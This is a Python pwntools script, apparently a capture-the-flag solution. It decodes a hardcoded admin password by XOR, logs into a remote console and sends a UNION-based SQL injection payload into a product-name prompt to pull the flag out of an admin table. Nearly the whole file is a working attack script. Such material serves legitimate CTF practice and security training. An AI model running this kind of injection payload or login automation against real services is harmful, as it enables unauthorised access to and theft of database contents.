from pwn import *

BINARY = ''
HOST = ''
GDB_SCRIPT = ''

def xor_decrypt(cipher, key):
    plain = []
    for i, char in enumerate(cipher):
        plain_char = char ^ key[i % len(key)]
        plain.append(chr(plain_char))
    
    return ''.join(plain)

def main():
    proc = get_process() # set is_remote = False for local testing

    data1 = [ 0x49, 0x4e, 0x54, 0x49, 0x47, 0x52, 0x49, 0x54, 0x49, 0x31, 0x33, 0x33, 0x37, 0x75, 0x70, 0x23 ]
    data2 = [ 0x07, 0x7d, 0x22, 0x7a, 0x15, 0x15, 0x79, 0x3a, 0x27, 0x71, 0x05, 0x46, 0x04, 0x51, 0x54, 0x02 ]

    password = xor_decrypt(data1, data2)
    sqli = b'1\' UNION SELECT flag, 1 from admin;#'
    
    # Login to admin console
    proc.sendlineafter(b'Please enter the admin password:', password)

    # Exploit SQLI to get flag
    proc.sendlineafter(b'Exit', b'1')
    proc.sendlineafter(b'Enter product name:', sqli)

    # Print flag
    proc.recvuntil(b'Name: ')
    flag = proc.recvline().strip().decode()
    print(f'Flag: {flag}')


# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()